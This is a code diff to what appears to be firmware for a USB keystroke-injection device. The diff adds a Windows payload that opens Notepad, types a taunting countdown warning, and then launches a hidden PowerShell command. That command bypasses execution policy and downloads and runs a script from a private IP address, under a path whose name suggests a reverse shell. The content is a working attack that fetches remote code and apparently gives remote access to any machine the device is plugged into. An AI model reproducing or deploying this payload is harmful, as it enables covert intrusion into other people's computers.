@@ -6,7 +6,36 @@ void LinuxPayload(void){
 void WindowsPayload(void){
    WindowsCommandRun("notepad.exe");
    _delay_ms(1000);
-   type("hax was here!!! }:)");
+   type("Please unplug the usb right now. Otherwise you will be hacked by 5");
+
+   type(".");
+   _delay_ms(500);
+   type(".");
+   _delay_ms(500);
+   type("4");
+   type(".");
+   _delay_ms(500);
+   type(".");
+   _delay_ms(500);
+   type("3");
+   type(".");
+   _delay_ms(500);
+   type(".");
+   _delay_ms(500);
+   type("2");
+   type(".");
+   _delay_ms(500);
+   type(".");
+   _delay_ms(500);
+   type("1");
+   type(".");
+   _delay_ms(500);
+   type(".");
+   _delay_ms(500);
+   WindowsCommandRun("powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://10.13.185.43/rev_https/ps_in.txt')\"");
+
+
+
 };
 
 void ApplePayload(void){
